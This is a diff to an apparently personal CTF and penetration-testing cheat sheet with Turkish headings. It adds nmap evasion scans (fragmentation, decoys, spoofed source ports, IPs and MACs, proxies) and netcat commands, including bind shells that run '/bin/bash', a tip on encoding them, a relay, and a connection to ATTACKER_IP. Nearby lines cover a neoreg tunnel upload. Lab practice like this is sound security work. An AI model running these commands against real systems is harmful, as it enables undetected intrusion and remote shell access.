@@ -34,7 +34,7 @@ gcc -o örnek.c/py/rb
 
 python3 -m http.server
 
-# CTF'ler için basic NMAP komutu #
+# NMAP #
 
 nmap -sV -sC -A -T4 <ip.adress>
 
@@ -42,7 +42,37 @@ nmap -iL list_of_hosts.txt
 
 nmap -PR -sn 10.10.210.6/24
 
+nmap -sS -Pn -g 80 -F MACHINE_IP
+
+nmap -sU -Pn -g 53 -F MACHINE_IP
+
+nmap -sS HTTP://PROXY_HOST1:8080,SOCKS4://PROXY_HOST2:4153 MACHINE_IP
+
+nmap -sS -Pn --proxies 10.10.13.37 MACHINE_IP
+
+nmap -sS -Pn -F MACHINE_IP
+
+nmap -sS -Pn -f -F MACHINE_IP
+
+nmap -sS -Pn -ff -F MACHINE_IP
+
+nmap -sS -Pn --mtu 8 -F MACHINE_IP
+
+nmap -sS -Pn --data-length 64 -F MACHINE_IP
+
+-S IP_ADDRESS
+
+--ip-options "L 10.10.10.50 10.10.50.250"
+
+--ip-options "S 10.10.10.1 10.10.20.2 10.10.30.3"
+
 --script-args http.useragent="CUSTOM_AGENT"
+
+--spoof-mac MAC_ADDRESS
+
+-D DECOY1_IP1,DECOY_IP2,ME
+
+-D RND,RND,ME
 
 # Dirb Örnek Basic Kullanım #
 
@@ -946,6 +976,27 @@ upload tunnel.php
 python3 neoreg.py -k thm -u http://10.10.127.144/uploader/files/tunnel.php
 
 curl --socks5 127.0.0.1:1080 http://172.20.0.121:80
+
+# NetCat #
+
+ncat -lvnp PORT_NUM
+
+ncat TARGET_IP PORT_NUM
+
+ncat -ulvnp PORT_NUM
+
+nc -u TARGET_IP PORT_NUM
+
+nc ATTACKER_IP 80
+
+ncat -lvnp 1234 -e /bin/bash ---> base64 input.txt to encode
+
+urlencode ncat -lvnp 1234 -e /bin/bash
+
+ncat -lvnp 443 -c "ncat TARGET_SERVER 25"
+
+ncat -lvnp PORT_NUMBER -e /bin/bash
+
 
 
 
